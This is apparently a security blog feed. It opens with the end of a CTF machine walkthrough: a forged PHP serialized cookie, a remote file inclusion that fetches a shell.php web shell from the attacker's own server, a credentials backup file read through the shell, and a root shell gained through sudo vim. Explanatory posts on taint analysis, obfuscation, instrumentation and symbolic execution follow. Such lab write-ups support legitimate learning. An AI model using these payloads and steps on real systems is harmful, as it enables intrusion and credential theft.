<p><img src="/Serial_1/12_image.png" alt="&ldquo;admin_cookie&rdquo;">
<em>Output a cookie with user set as admin.</em></p>
<p>We change the initialization class of the object <strong>$this→wel</strong>.</p>
<p><img src="/Serial_1/10_image.png" alt="&ldquo;wel&rdquo;">
<em>Modified wel object.</em></p>
<p>We point the <strong>$type_log</strong> to <em><strong>/etc/passwd</strong></em>.</p>
<p><img src="/Serial_1/11_image.png" alt="&ldquo;type_log&rdquo;">
<em>Modified $type_log variable.</em></p>
<p>We then execute the <em><strong>user.class.php</strong></em> file to see if our changes yielded any results.</p>
<p>Run <code>php user.class.php</code></p>
<p><img src="/Serial_1/13_image.png" alt="&ldquo;user.class&rdquo;">
<em>Modified user.class.php output.</em></p>
<p>We got the output of <em><strong>/etc/passwd</strong></em>, as specified in the changes.</p>
<p>A new cookie is also obtained.</p>
<p><code>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MTE6Ii9ldGMvcGFzc3dkIjt9fQ==</code></p>
<p>Let&rsquo;s decode it and check it&rsquo;s contents.</p>
<p><code>O:4:&quot;User&quot;:2:{s:10:&quot;Username&quot;;s:5:&quot;admin&quot;;s:9:&quot;Userwel&quot;;O:3:&quot;Log&quot;:1:{s:13:&quot;Logtype_log&quot;;s:11:&quot;/etc/passwd&quot;;}}</code></p>
<p>This proves that the instructions lie in the parameters provided inside the cookie.</p>
<p>We exploit the RFI vulnerability present here by spawning a local server and linking the <strong>$type_log</strong> variable to this shell file.</p>
<p><img src="/Serial_1/14_image.png" alt="&ldquo;python_server&rdquo;">
<em>Spawn a python3 Simple HTTP Server.</em></p>
<p>And modify the <em><strong>log.class.php</strong></em> file to fetch the shell.php file.</p>
<p>Added <code>http://192.168.1.6:8000/shell.php</code></p>
<p>Format: <code>http://LHIP:8000/shell.php</code></p>
<p><img src="/Serial_1/15_image.png" alt="&ldquo;type_log&rdquo;">
<em>Modified $type_log variable.</em></p>
<p>Where, the <em><strong>shell.php</strong></em> file is as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]);
<span style="color:#75715e">?&gt;</span>
</code></pre></div><p>Obtain the new cookie, and replace it with the previous cookie.</p>
<p>Run <code>php user.class.php</code></p>
<p><img src="/Serial_1/19_image.png" alt="&ldquo;cookie_shell&rdquo;">
<em>Cookie with shell.</em></p>
<p>The new cookie <code>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MzM6Imh0dHA6Ly8xOTIuMTY4LjEuNjo4MDAwL3NoZWxsLnBocCI7fX0=</code></p>
<p>Decodes to be</p>
<p><code>O:4:&quot;User&quot;:2:{s:10:&quot;Username&quot;;s:5:&quot;admin&quot;;s:9:&quot;Userwel&quot;;O:3:&quot;Log&quot;:1:{s:13:&quot;Logtype_log&quot;;s:33:&quot;http://192.168.1.6:8000/shell.php&quot;;}}</code></p>
<p>A <code>GET</code> request at <code>http://192.168.1.3/?cmd=whoami</code></p>
<p><code>Format: http://LHIP/?cmd=COMMAND</code></p>
<p><img src="/Serial_1/21_image.png" alt="&ldquo;request&rdquo;">
<em>Output of GET request.</em></p>
<p>It worked!</p>
<p>We know have a makeshift shell.</p>
<p>After exploring around, I found a file named <em><strong>credentials.txt.bak</strong></em> in the root directory.</p>
<p>A <code>GET</code> request at <code>http://192.168.1.3/?cmd=ls /</code></p>
<p><code>Format: http://LHIP/?cmd=ls /</code></p>
<p><img src="/Serial_1/22_image.png" alt="&ldquo;request&rdquo;">
<em>Output of GET request.</em></p>
<p>A <code>GET</code> request at <code>http://192.168.1.3/?cmd=cat /credentials.txt.bak</code></p>
<p>Format: <code>http://LHIP/?cmd=cat /credentials.txt.bak</code></p>
<p><img src="/Serial_1/23_image.png" alt=""></p>
<p>Output of GET request.</p>
<blockquote>
<p>sk4:KywZmnPWW6tTbW5w</p>
</blockquote>
<p>They look like credentials of some sort.</p>
<p>I was able to successfully connect to the SSH service using these values as credentials. In the home directory itself is a file named <em><strong>flag.txt</strong></em>. It&rsquo;s the user flag.</p>
<p><img src="/Serial_1/25_image.png" alt="&ldquo;user_flag&rdquo;">
<em>User flag.</em></p>
<p>Now, for privilege escalation, let&rsquo;s first find out all the binaries that can run with the superuser privilege.</p>
<p>Run <code>sudo -l</code></p>
<p><img src="/Serial_1/28_image.png" alt="&ldquo;sudo&rdquo;">
-Output of sudo -l._</p>
<p>Vim can be run as sudo.</p>
<p>Run <code>sudo /usr/bin/vim</code></p>
<p>When you are in command mode(you&rsquo;re there already when vim opens), press <code>:</code> to enter commands.</p>
<p>Enter <code>!/bin/bash</code></p>
<p><img src="/Serial_1/29_image.png" alt="&ldquo;root_shell&rdquo;">
<em>Spawn a shell from inside vim.</em></p>
<p>This forcefully spawns a bash shell. Since it is spawned via the vim binary, it will have the same privileges as the vim binary. Thus we obtained a root shell.</p>
<p>Then just navigate to the root directory and read the flag file.</p>
<p><img src="/Serial_1/30_image.png" alt="&ldquo;root_flag&rdquo;">
<em>Root flag.</em></p>
]]></content>
        </item>
        
        <item>
            <title>Taint Analysis</title>
            <link>https://hexterisk.github.io/blog/posts/2020/05/03/taint-analysis/</link>
            <pubDate>Sun, 03 May 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/05/03/taint-analysis/</guid>
            <description>Taint Analysis is a program analysis technique that allows you to determine the influence that a selected program state has on other parts of the program state. Taint any data that a program receives from the network, track that data, and raise an alert if it affects the program counter. If an operation uses the value of some tainted object, say X, to derive a value for another, say Y, then object Y becomes tainted.</description>
            <content type="html"><![CDATA[<p><strong>Taint Analysis</strong> is a program analysis technique that allows you to determine the influence that a selected program state has on other parts of the program state. Taint any data that a program receives from the network, track that data, and raise an alert if it affects the program counter. If an operation uses the value of some tainted object, say <em>X</em>, to derive a value for another, say <em>Y</em>, then object <em>Y</em> becomes tainted. Object <em>X</em> tainted the object <em>Y</em>. Taint Analysis can be classified into two types.</p>
<h3 id="static-taint-analysis">Static Taint Analysis</h3>
<p>The advantage of using static analysis is the fact that it provides better code coverage than dynamic analysis. On the other hand, the principal disadvantage of the static analysis is that it&rsquo;s not as accurate than the dynamic analysis - It cannot access the runtime information for example. We can&rsquo;t retrieve registers or memory values.</p>
<h3 id="dynamic-taint-analysis">Dynamic Taint Analysis</h3>
<p><strong>DTA (Dynamic Taint Analysis)</strong>, also called <strong>DFT</strong> (<strong>Data Flow Tracking)</strong>, <strong>Taint Tracking</strong>,</p>
<ul>
<li>Indicate a control-flow hijacking attack.</li>
<li>Implemented on top of a dynamic binary instrumentation platform.</li>
<li>Taint analysis on static instrumentation require inserting the necessary taint analysis logic at compile time rather than at runtime. Usually results in better performance but requires source code.</li>
<li>DTA instruments all instructions that handle data to track data flow, either in registers or in memory. In practice, this includes nearly all instructions, which means that DTA leads to very high performance overhead on instrumented programs.</li>
<li>DTA only for offline analysis of programs since slowdowns of 10x are expected. While a 10x overhead may be acceptable during security tests of a web server, for instance, it usually isn’t okay in production.</li>
</ul>
<h2 id="steps">Steps</h2>
<h3 id="taint-sources">Taint Sources</h3>
<p>Program locations where the data that’s interesting to track is selected, like system calls. Data is tainted using API calls, which take a register or memory address to mark as tainted as the input. These API calls are provided by the DTA library being used.</p>
<p>For example,</p>
<ol>
<li>Track any data that comes in from the network to see whether it exhibits any behavior that could indicate an attack. Instrument network-related system calls like <em>recv</em> or <em>recvfrom</em> with a callback function that’s called by the dynamic instrumentation platform whenever these system calls occur. In that callback function, you loop over all the received bytes and mark them as tainted. So, the <em>recv</em> and <em>recvfrom</em> functions are your <em><strong>taint sources</strong></em>.</li>
<li>While tracking data read from file, system calls such as <em>read</em> are the <em><strong>taint sources</strong></em>.</li>
<li>Tracking numbers that are the product of two other numbers, the output operands of multiplication instructions can be tainted, which are then the <em><strong>taint sources</strong></em>.</li>
</ol>
<h3 id="taint-sinks">Taint Sinks</h3>
<p>Program locations checked to see whether they can be influenced by tainted data. When taint is detected at a taint sink, some response is triggered, such as raising an alert. DTA libraries provide functions to check whether a register or memory location is tainted.</p>
<p>For example, to detect control-flow hijacking attacks, indirect calls, indirect jumps, and return instructions are instrumented with callbacks that check whether the targets of these instructions are influenced by tainted data. These instrumented instructions are <em><strong>taint sinks</strong></em>.</p>
<h3 id="tracking-taint-propagation">Tracking Taint Propagation</h3>
<p>All instructions handling data are instrumented to track tainted data&rsquo;s flow. The instrumentation code determines propagation of taint from the input operands of an instruction to its output operands. For example, if the input operand of a <em>mov</em> is tainted, the instrumentation code will mark the output operand as tainted as well, since it’s clearly influenced by the input operand. In this way, tainted data may eventually propagate all the way from a taint source to a taint sink. Tracking taint is a complicated process because determining which parts of an output operand to taint isn’t always trivial. Taint propagation is subject to a taint policy that specifies the taint relationship between input and output operands. There are different taint policies that can be used depending on the needs. Taint propagation is typically handled by a dedicated DTA library, such as libdft.</p>
<p>##DTA Design Factors</p>
<p>There are multiple factors that determine the balance between the performance and versatility of the system.</p>
<h3 id="taint-granularity">Taint Granularity</h3>
<p>The unit of information by which a DTA system tracks taint. An important factor influencing its accuracy.</p>
<p>For example, taking white bytes as untainted and grey ones as tainted,</p>
<p><img src="/Taint_Analysis/image.png" alt="&ldquo;bit&rdquo;">
<em>Bit-Granularity.</em></p>
<p>All the bits in the first operand are tainted, while no bits are tainted in the second operand. Since this is a bitwise AND operation, if an attacker controls only the first input operand, then the only bit positions in the output that they can affect are those where the second operand has a 1. All other output bits will always be set to 0. Thus, only that one output bit is tainted.</p>
<p><img src="/Taint_Analysis/1_image.png" alt="&ldquo;byte&rdquo;">
<em>Byte-Granularity.</em></p>
<p>Byte-Granularity DTA system can’t consider each bit individually, the whole output is marked as tainted. The system simply sees a tainted input byte and a nonzero second operand and therefore concludes that an attacker could affect the output operand.</p>
<h3 id="taint-colors">Taint Colors</h3>
<p>Using multiple taint colors to apply a different color to each taint source so that when taint reaches a sink, the source affecting that sink can be distinguished.</p>
<p>It may seem possible to store 255 different colors in 1 byte of taint information since a byte can store 255 distinct nonzero values. However, that approach doesn’t allow for different colors to mix. Without the ability to mix colors, distinguishing between taint flows when two taint flows run together is impossible: if a value is affected by two different taint sources, each with their own color, it&rsquo;s not possible to record both colors in the affected value’s taint information. To support mixing colors, a dedicated bit per taint color is required. For instance, for 1 byte of taint information, the colors 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, and 0x80 can be supported. Then, if a particular value is tainted by both the colors 0x01 and 0x02, the combined taint information for this value is 0x03, which is the bitwise OR of the two colors.</p>
<h3 id="taint-propagation-policies">Taint Propagation Policies</h3>
<p>The taint policy of a DTA system describes how the system propagates taint and how it merges taint colors if multiple taint flows run together.</p>
<p><img src="/Taint_Analysis/2_image.png" alt="&ldquo;propagation&rdquo;"></p>
<p>Taint Propagation Examples for a Byte-Granularity DTA System with Two Colors, Red (R) and Blue (B).</p>
<h3 id="overtainting-and-undertainting">Overtainting and Undertainting</h3>
<p><strong>Undertainting</strong> occurs when a value isn’t tainted even though it “should be,” which means that an attacker can get away with influencing that value without being noticed.</p>
<p><strong>Overtainting</strong> means that values end up tainted even though they “shouldn’t be.” This results in false positives, such as alerts when there is no actual attack in progress.</p>
<p>They can be a result of the taint policy or the way control dependencies are handled.</p>
<h3 id="control-dependencies">Control Dependencies</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">var <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
<span style="color:#66d9ef">while</span>(cond<span style="color:#f92672">--</span>) var<span style="color:#f92672">++</span>;
</code></pre></div><p>An attacker who controls the loop condition cond can determine the value of <em>var</em>. This is called a <strong>control dependency</strong>. While the attacker can control var through <em>cond</em>, there’s no explicit data flow between the two variables.</p>
<h3 id="shadow-memory">Shadow Memory</h3>
<p>Region of virtual memory allocated by the DTA system to keep track of the taint status of the rest of the memory. Typically, DTA systems also allocate a special structure in memory where they keep track of taint information for CPU registers. The structure of the shadow memory differs depending on the taint granularity and how many taint colors are supported.</p>
<p><img src="/Taint_Analysis/3_image.png" alt="&ldquo;shadow&rdquo;"></p>
<p>Shadow memory with byte-granularity and 1, 8, or 32 colors per byte.</p>
<h5 id="bitmap-based-shadow-memory">Bitmap-Based Shadow Memory</h5>
<p><strong>Bitmap</strong> ➊ stores a single bit of taint information per byte of virtual memory, so it can represent only one color: each byte of memory is either tainted or untainted. Bytes A–D are represented by the bits 1101, meaning that bytes A, B, and D are tainted, while byte C is not.</p>
<h5 id="multicolor-shadow-memory">Multicolor Shadow Memory</h5>
<p>➋ supports eight colors and uses 1 byte of shadow memory per byte of virtual memory. Again, bytes A, B, and D are tainted (with colors 0x01, 0x04, and 0x20, respectively), while byte C is untainted. To store taint for every virtual memory byte in a process, an unoptimized eight-color shadow memory must be as large as that process’s entire virtual memory space. The final shadow memory type supports 32 colors ➌. Bytes A, B, and D are tainted with the colors 0x01000000, 0x00800000, and 0x00000200, respectively, while byte C is untainted. This requires 4 bytes of shadow memory per memory byte, which is quite a hefty memory overhead.</p>
<p>There’s usually no need to store shadow bytes for the memory area where the shadow memory itself is allocated, so omit shadow bytes for that memory area. Even so, without further optimizations, the shadow memory still requires half of the virtual memory. This can be reduced further by dynamically allocating shadow memory only for the parts of virtual memory that are actually in use (on the stack or heap), at the cost of some extra runtime overhead. Moreover, virtual memory pages that are not writable can never be tainted, all of those to the same “zeroed-out” shadow memory page can be safely mapped. With these optimizations, multicolor DTA becomes manageable, though it still requires a lot of memory.</p>
]]></content>
        </item>
        
        <item>
            <title>Binary Obfuscation</title>
            <link>https://hexterisk.github.io/blog/posts/2020/04/28/binary-obfuscation/</link>
            <pubDate>Tue, 28 Apr 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/04/28/binary-obfuscation/</guid>
            <description>The main aim of Binary Obfuscation is to hinder the process of static analysis of a binary. Renaming the symbols(variables and functions) of a binary implies that the clues as to what data a variable holds or what task a function performs that could be obtained from their names, are lost. This makes it a little harder for the analysts to keep a track of all the symbols without documenting them.</description>
            <content type="html"><![CDATA[<p>The main aim of <strong>Binary Obfuscation</strong> is to hinder the process of static analysis of a binary. </p>
<p>Renaming the <strong>symbols</strong>(variables and functions) of a binary implies that the clues as to what data a variable holds or what task a function performs that could be obtained from their names, are lost. This makes it a little harder for the analysts to keep a track of all the symbols without documenting them. </p>
<p>Moreover, some obfuscation techniques specifically target automated tools, rendering their outputs practically unusable. For example, careful modification of some binary instructions can cause automated disassemblers to fail, while it executes just the same as the original instructions.</p>
<h3 id="junk-code-insertion">Junk Code Insertion</h3>
<p>The actual instruction is hidden among a bunch of other instructions. While the actual instruction to be executed might be trivial, these “other” instructions seem to be performing something pretty complicated, yet essentially do zero work.</p>
<p>Such instructions when closely analysed, can easily be segregated into typically useless, and can be changed to <em>nop</em> so it&rsquo;s easier to look at the bigger picture, or simpler to look at when revisiting this part of the binary.</p>
<p><img src="/Binary_Obfuscation/cc5ac2e806cd2b62.gif" alt="Junk insertion">
<em>Junk Code Insertion technique.</em></p>
<h3 id="metamorphic-code">Metamorphic Code</h3>
<p>The actual instruction is expanded into a series of instruction that essentially give the same result. The effectiveness depends on the creativity of how complex can a simple instruction be made to look.</p>
<p><img src="/Binary_Obfuscation/efa49547f45c2d7e.gif" alt="Metamorphic Code">
<em>Metamorphic Code technique.</em></p>
<h3 id="data-encoding">Data Encoding</h3>
<p>Static data values are forced to be computed at run time instead of hard coding them. A value to be operated upon can be calculated through a number of arithmetic operations instead of straightaway including it in the code itself. This value is ephemeral, that is, it remains in the memory as long as it&rsquo;s needed and disappears right after. This entails extra work to be done at the time of analysis to decipher the values being operated upon, while it renders tools like <strong>strings</strong> useless.</p>
<p><img src="/Binary_Obfuscation/de138c9f51bad4b5.gif" alt="Data Encoding">
<em>Data Encoding technique.</em></p>
<h3 id="opaque-predicates">Opaque Predicates</h3>
<p>Extra computational checks are added in place of trivial branching instructions that will always yield the same output. The flow of code execution, therefore, now include checks that aren&rsquo;t needed since the flow is set in code and is always going to be the same. This simply makes the code a lot more complicated than it actually is. The involvement of such computational instructions as well as presence of extra branches(that will never be taken) can hinder the analyst and confuse decompilers.</p>
<p><img src="/Binary_Obfuscation/2_image.png" alt="&ldquo;Opaque Predicates">
<em>Opaque Predicates technique.</em></p>
<h3 id="splitting">Splitting</h3>
<p>Blocks of codes are split into smaller blocks, with the addition of unnecessary jumps and calls, so as to make it difficult for the analyst to keep track of flow of code execution.</p>
<p><img src="/Binary_Obfuscation/1_image.png" alt="Splitting">
<em>Splitting technique.</em></p>
<h3 id="control-flow-flattening">Control Flow Flattening</h3>
<p>A simple flow of code execution is transformed into a <strong>state machine</strong>. A state of decision making(<strong>dispatch table</strong>) is introduced which keeps track of the current state of execution, updates the current state at every pass and transfers the execution to different branches based on the current state.</p>
<p><img src="/Binary_Obfuscation/350577af599d101d.gif" alt="Control Flow Flattening">
<em>Control Flow Flattening technique.</em></p>
<h3 id="polymorphic-code">Polymorphic Code</h3>
<p>Code that has the ability to modify itself at every run(or even during the same run) and take different paths depending on it&rsquo;s current state, while achieving the same task every time. Even though this technique is tough to analyse, it requires parts of memory to be made writable and executable so as to be able to write it&rsquo;s own modified version in memory to be executed. This factor not only makes it detectable, but can even introduce vulnerabilities if not done</p>
]]></content>
        </item>
        
        <item>
            <title>Binary Instrumentation</title>
            <link>https://hexterisk.github.io/blog/posts/2020/04/25/binary-instrumentation/</link>
            <pubDate>Sat, 25 Apr 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/04/25/binary-instrumentation/</guid>
            <description>Inserting new code at any point in an existing binary to observe or modify the binary’s behavior in some way is called instrumenting the binary. The point where you add new code is called the instrumentation point, and the added code is called instrumentation code.
Tradeoffs of Dynamic and Static Binary Instrumentation.
Static Binary Instrumentation Static Binary Instrumentation works by disassembling a binary and then adding instrumentation code where needed and storing the updated binary permanently on disk.</description>
            <content type="html"><![CDATA[<p>Inserting new code at any point in an existing binary to observe or modify the binary’s behavior in some way is called <strong>instrumenting</strong> the binary. The point where you add new code is called the <strong>instrumentation point</strong>, and the added code is called <strong>instrumentation code</strong>.</p>
<p><img src="/Binary_Instrumentation/3_image.png" alt="&ldquo;tradeoffs&rdquo;">
<em>Tradeoffs of Dynamic and Static Binary Instrumentation.</em></p>
<h2 id="static-binary-instrumentation">Static Binary Instrumentation</h2>
<p><strong>Static Binary Instrumentation</strong> works by disassembling a binary and then adding instrumentation code where needed and storing the updated binary permanently on disk.</p>
<h3 id="naive-implementation">Naive Implementation</h3>
<p><img src="/Binary_Instrumentation/image.png" alt="&ldquo;sbi&rdquo;">
<em>A nongeneric SBI approach that uses jmp to hook instrumentation points.</em></p>
<p>Instrumenting the instruction ➊, add instrumentation code to run before and after that instruction. Overwrite it with a <em>jmp</em> to your instrumentation code ➋, stored in a separate code section or library. The instrumentation code runs any pre-instrumentation code ➌, the original instruction ➍ and then the post-instrumentation code ➎. Finally, the instrumentation code jumps back to the instruction following the instrumentation point ➏, resuming normal execution.</p>
<p>The issue is that a <em>jmp</em> instruction is 5-bytes, 1 opcode byte with a 32-bit offset. Replacing an instruction with a smaller byte-length will overwrite following bytes, such as instrumenting a <em>xor esi,esi (2-bytes)</em> would require replacing it with a 5-byte <em>jmp</em>.</p>
<h3 id="int3-approach">int3 Approach</h3>
<p>The x86 int3 instruction generates a software interrupt that are caught as (on Linux) <strong>SIGTRAP signals</strong>. It’s only 1 byte long, so any instruction can be overwritten with it. On SIGTRAP, use Linux’s ptrace API to find out at which address the interrupt occurred, telling you the instrumentation point address. You can then invoke the appropriate instrumentation code for that instrumentation point.</p>
<h3 id="trampoline-approach">Trampoline Approach</h3>
<h5 id="direct-calls">Direct Calls</h5>
<p><img src="/Binary_Instrumentation/1_image.png" alt="&ldquo;trampolines&rdquo;">
<em>Static binary instrumentation with trampolines.</em></p>
<p>SBI engine creates copies of all the original functions, places them in a new code section, and overwrites the first instruction of each original function with  <em>jmp</em> instructions called <strong>trampolines</strong> to redirect the original code to the instrumented copy. Whenever a call or jump transfers control to a part of the original code, the trampoline at that location immediately jumps to the corresponding instrumented code. Instruction <em>jmp</em> is 5-bytes, so it may partially overwrite and corrupt multiple instructions, creating junk bytes right after the trampoline. It isn’t a problem since these corrupted instructions are never executed.</p>
<p>As soon as <em>f1</em> is called, the trampoline jumps to <em>f1_copy</em> ➊, the instrumented version of <em>f1</em>. Junk bytes at ➋ aren’t executed. SBI engine inserts several <em>nop</em> in <em>f1_copy</em> ➌ so that to instrument an instruction, the SBI engine can simply overwrite the <em>nop</em> at that instrumentation point with a <em>jmp</em> or call to a chunk of instrumentation code. In the figure, all <em>nop</em> regions are unused except for the last one, just before the <em>ret</em>. SBI engine patches the offsets of all relative <em>jmp</em>, and replaces all 2-byte relative <em>jmp</em> having an 8-bit offset with a corresponding 5-byte version that has a 32-bit offset ➍ as the offset between <em>jmp</em> and their targets may become too large to encode in 8 bits. SBI engine rewrites direct calls too, such as <em>call f2</em> so that they target the instrumented function instead of the original ➎. Trampolines are needed at the start of every original function to accommodate indirect calls. For the engine instrumenting every <em>ret</em>, it overwrites the <em>nop</em> reserved for this purpose with a <em>jmp</em> or <em>call</em> to the instrumentation code ➏, <em>hook_ret</em>, which is placed in a shared library and reached by a call that the SBI engine placed at the instrumentation point, first saves state ➐, such as register contents, and then runs any instrumentation code that you specified. Finally, it restores the saved state ➑ and resumes normal execution by returning to the instruction following the instrumentation point.</p>
<p><img src="/Binary_Instrumentation/2_image.png" alt="&ldquo;indirect&rdquo;">
<em>Indirect control transfers in a statically instrumented binary.</em></p>
<h5 id="indirect-calls">Indirect Calls</h5>
<p>The SBI engine doesn’t alter code that computes addresses, so the target addresses used by indirect calls point to the original function ➊. Because there’s a trampoline at the start of every original function, control flows immediately back to the instrumented version of the function ➋.</p>
<p>At the binary level, switch statements are often implemented using a jump table that contains all the addresses of the possible switch cases. The switch computes the corresponding jump table index and uses an indirect <em>jmp</em> to jump to the address stored there ➊. The addresses stored in the jump table all point into the original code ➋. Thus, the indirect <em>jmp</em> ends up in the middle of an original function, where there’s no trampoline, and resumes execution there ➌. To avoid this problem, the SBI engine must either patch the jump table, changing original code addresses to new ones, or place a trampoline at every switch case in the original code. Unfortunately, basic symbolic information (as opposed to extensive DWARF information) contains no information on the layout of switch statements, making it hard to figure out where to place the trampolines. Additionally, there may not be enough room between the switch statements to accommodate all trampolines. Patching jump tables is also dangerous because you risk erroneously changing data that just happens to be a valid address but isn’t really part of a jump table.</p>
<h5 id="reliability">Reliability</h5>
<ul>
<li>Error-prone.</li>
<li>Programs may (however unlikely) contain very short functions that don’t have enough room for a 5-byte <em>jmp</em>, requiring the SBI engine to fall back to another solution like the int 3 approach. </li>
<li>If the binary contains any inline data mixed in with the code, trampolines may inadvertently overwrite part of that data, causing errors when the program uses the data. </li>
<li>All this is assuming that the disassembly used is correct in the first place; if it’s not, any changes made by the SBI engine may break the binary.</li>
</ul>
<h5 id="pie">PIE</h5>
<ul>
<li>On 32-bit x86, PIE binaries read the program counter by executing a call instruction and then reading the return address from the stack. </li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">// copies the return address into ebx and then returns.
</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>__x86.get_pc_thunk.bx<span style="color:#f92672">&gt;:</span>
	mov ebx,DWORD PTR [esp]
	ret
</code></pre></div><ul>
<li>On x64, you can read the program counter (<em>rip</em>) directly. </li>
<li>The danger with PIE binaries is that they may read the program counter while running instrumented code and use it in address computations. This likely yields incorrect results because the layout of the instrumented code differs from the original layout that the address computation assumes. SBI engines solve this problem using instrument code constructs that read the program counter such that they return the value the program counter would have in the original code. That way, subsequent address computations yield the original code location just as in an uninstrumented binary, allowing the SBI engine to intercept control there with a trampoline.</li>
</ul>
<h2 id="dynamic-binary-instrumentation">Dynamic Binary Instrumentation</h2>
<p>DBI engines monitor binaries (or rather, processes) as they execute and instrument the instruction stream. They don’t require disassembly or binary rewriting, making them less error-prone.</p>
<h3 id="architecture">Architecture</h3>
<p><img src="/Binary_Instrumentation/4_image.png" alt="&ldquo;dbi&rdquo;">
<em>Architecture of a DBI system.</em></p>
<p>The DBI engine exposes an API that allows you to write user-defined DBI tools (often in the form of a shared library loaded by the engine) that specify which code should be instrumented and how. For example, the DBI tool shown on the right side implements (in pseudocode) a simple profiler that counts how many basic blocks are executed. To achieve that, it uses the DBI engine’s API to instrument the last instruction of every basic block with a callback to a function that increments a counter.</p>
<p>DBI tool’s initialization function registers a function called <em>instrument_bb</em> with the DBI engine ➊. This function tells the DBI engine how to instrument every basic block; in this case, it adds a callback to <em>bb_callback</em> after the last instruction in the basic block. The DBI engine then starts the application ➋. The DBI engine never runs the application process directly but instead runs code in a <strong>code cache</strong> that contains all the instrumented code. Initially, the code cache is empty, so the DBI engine fetches a block of code from the process ➌ and instruments that code ➍ as instructed by the DBI tool ➎. Assuming the engine instruments code at basic block granularity (not always) JIT compiler ➏, which re-optimizes the instrumented code and stores the compiled code in the code cache ➐. The JIT compiler also rewrites control flow instructions to ensure that the DBI engine retains control, preventing control transfers from continuing execution in the uninstrumented application process.</p>
<p>This instrumented and JIT-compiled code now executes in the code cache until there’s a control-flow instruction that requires fetching new code or looking up another code chunk in the cache ➑. The instrumented code contains callbacks to functions in the DBI tool that observe or modify the code’s behavior ➒.</p>
<ul>
<li>The JIT compiler in a DBI engine doesn’t translate the code into a different language; it compiles from native machine code to native machine code. It’s only necessary to instrument and JIT-compile code the first time it’s executed.</li>
<li>DBI engines like Pin and DynamoRIO reduce runtime overhead by rewriting control-flow instructions when possible, so they jump directly to the next block in the code cache without mediation by the DBI engine. When that’s not possible (for example, for indirect calls), the rewritten instructions return control to the DBI engine so that it can prepare and start the next code chunk. While most instructions run natively in the code cache, the DBI engine may emulate some instructions instead of running them directly. For example, Pin does this for system calls like execve that require special handling by the DBI engine.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Principles of Symbolic Execution</title>
            <link>https://hexterisk.github.io/blog/posts/2020/04/20/principles-of-symbolic-execution/</link>
            <pubDate>Mon, 20 Apr 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/04/20/principles-of-symbolic-execution/</guid>
            <description>Symbolic Execution, or symbex, is a software analysis technique that expresses program state in terms of logical formulas that you can automatically reason about to answer complex questions about a program’s behavior. Can automatically increase the code coverage of dynamic analyses by generating new inputs that lead to unexplored program paths. Apply it sparingly and carefully because of scalability issues.
 Symbex executes (or emulates) an application with symbolic values.  Symbolic values represent a domain covering possible concrete values, represented by symbols like φ.</description>
            <content type="html"><![CDATA[<p><strong>Symbolic Execution</strong>, or <strong>symbex</strong>, is a software analysis technique that expresses program state in terms of logical formulas that you can automatically reason about to answer complex questions about a program’s behavior. Can automatically increase the code coverage of dynamic analyses by generating new inputs that lead to unexplored program paths. Apply it sparingly and carefully because of scalability issues.</p>
<ul>
<li>Symbex executes (or emulates) an application with <strong>symbolic values.</strong>
<ul>
<li><strong>Symbolic values</strong> represent a domain covering possible concrete values, represented by symbols like <em>φ</em>.</li>
</ul>
</li>
<li>Symbolic execution computes logical formulas over these symbols. These formulas represent the operations performed on the symbols during execution and describe limits for the range of values the symbols can represent.
<ul>
<li>Many symbex engines maintain the symbols and formulas as metadata in addition to concrete values rather than replacing the concrete values.</li>
</ul>
</li>
<li>The collection of symbolic values and formulas that a symbex engine maintains is called the <strong>Symbolic State</strong>.</li>
<li>Symbex engine computes two different kinds of formulas over these symbolic values: a set of <strong>symbolic expressions</strong> and a <strong>path constraint.</strong></li>
</ul>
<h3 id="symbolic-expressions">Symbolic Expressions</h3>
<p>A symbolic expression (<em>φj</em> , with <em>j ∈ N)</em> corresponds either to a symbolic value <em>αi</em> or to some mathematical combination of symbolic expressions, such as <em>φ3 = φ1 + φ2</em>.</p>
<ul>
<li><strong>Symbolic Expression Store</strong> (<em>σ</em>) is the set of all the symbolic expressions used in the symbolic execution.</li>
<li>Symbex maintains a mapping of variables (or in the case of binary symbex, registers and memory locations) to symbolic expression.</li>
<li>I refer to the combination of the path constraint and all symbolic expressions and mappings as the <strong>symbolic state</strong>.</li>
</ul>
<h3 id="path-constraint">Path Constraint</h3>
<p>A path constraint (π) encodes the limitations imposed on the symbolic expressions by the branches taken during execution. For instance, if the symbolic execution takes a branch if(x &lt; 5) and then another branch if(y &gt;= 4), where x and y are mapped to the symbolic expressions φ1 and φ2, respectively, the path constraint formula becomes φ1 &lt; 5 ∧ φ2 ≥ 4. </p>
<ul>
<li>Path constraints are sometimes referred to as <strong>Branch Constraints</strong>.</li>
</ul>
<p>A solution (possible concrete values) to a constraint which can lead the concrete execution of the program to the desired point is called a <strong>model</strong>. Models are computed automatically with a special program called a <strong>constraint solver</strong>, which is capable of solving for the symbolic values such that all constraints and symbolic expressions are satisfied. In some cases, the solver might also report that no solution exists, meaning that the path is unreachable. In general, it’s not feasible to cover all paths through a nontrivial program since the number of possible paths increases exponentially with the number of branches.</p>
